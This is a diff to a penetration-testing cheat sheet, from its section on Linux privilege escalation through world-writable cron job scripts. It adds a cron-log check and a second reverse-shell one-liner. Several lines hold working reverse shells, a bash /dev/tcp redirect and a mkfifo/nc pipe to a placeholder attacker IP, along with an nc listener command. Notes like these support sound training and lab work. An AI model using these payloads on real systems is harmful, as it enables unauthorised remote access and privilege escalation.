@@ -3821,12 +3821,13 @@ Note: HTTPTunnel uses both a client (`htc`) and a server (`hts`)
 #### <ins>Cron Jobs</ins>
 
 **File Permissions**
-- View the contents of the system-wide crontab `cat /etc/crontab` and see cron jobs, locate the file run with `locate <program>` and see the permissions with `ls -l <program full path>`
+- View the contents of the system-wide crontab `cat /etc/crontab`, the cron log file `grep "CRON" /var/log/syslog` and see cron jobs, locate the file run with `locate <program>` and see the permissions with `ls -l <program full path>`
 - If one of them is world-writable, substitute it with the following
   ```C
   #!/bin/bash
-  bash -i >& /dev/tcp/<ip of your machine>/4444 0>&1
+  bash -i >& /dev/tcp/<Your-IP>/4444 0>&1
   ```
+  - You can also try with `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <Your-IP> 4444 >/tmp/f`
 - Open a listener with `nc -nvlp 4444`
 
 **PATH Environment Variable**
